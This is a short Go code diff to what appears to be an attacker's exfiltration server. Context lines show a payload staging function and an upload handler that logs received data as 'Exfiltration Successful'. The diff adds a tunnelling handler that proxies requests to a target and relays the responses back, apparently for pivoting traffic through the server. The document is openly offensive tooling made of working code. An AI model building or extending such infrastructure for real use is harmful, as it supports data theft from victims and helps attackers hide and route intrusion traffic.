@@ -15,6 +15,7 @@ import (
 	"regexp"
 	"strconv"
 	"strings"
+	"time"
 )
 
 // Function for staging the payload directory
@@ -124,6 +125,42 @@ func uploadHandler(writer http.ResponseWriter, reader *http.Request) {
 	log.Printf("[+] Exfiltration Successful: %d bytes received from %s saved as %s", bytesCopied, reader.RemoteAddr, filename)
 	// Writes the header
 	writer.WriteHeader(http.StatusCreated)
+}
+
+// Function for handling tunneling traffic
+func handleTunnel(writer http.ResponseWriter, reader *http.Request, target string){
+	// Creates a new client
+	client := &http.Client{Timeout: 10 * time.Second}
+	// Stores the request made to the target
+	req, _ := http.NewRequest(reader.Method, target+reader.RequestURI, reader.Body)
+
+	// Copies the original headers
+	for key, value := range reader.Header {
+		// Copys the header
+		req.Header[key] = value
+	}
+
+	// Sends a request and gets the error from the request
+	resp, err := client.Do(req)
+	// Catches the error
+    if err != nil {
+		// Returns a http error
+        http.Error(writer, "Tunnel connection failed", http.StatusBadGateway)
+        return
+    }
+	// Closes when finished
+    defer resp.Body.Close()
+
+	// Relays the response back to the orignal sender
+	for key, value := range resp.Header {
+		// Writes the header
+		writer.Header()[key] = value
+	}
+
+	// Writes the status code
+	writer.WriteHeader(resp.StatusCode)
+	// Copies the response body
+    io.Copy(writer, resp.Body)
 }
 
 func main(){
